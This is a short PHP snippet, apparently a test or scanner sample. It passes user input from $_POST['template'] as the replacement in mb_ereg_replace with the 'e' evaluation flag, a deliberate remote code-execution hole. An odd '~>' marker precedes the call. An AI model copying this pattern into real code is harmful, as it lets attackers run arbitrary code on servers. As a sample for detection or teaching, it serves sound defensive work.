<?php
~>$result = mb_ereg_replace(
    '(.+)',
    $_POST['template'],
    $subject,
    'msre'
);
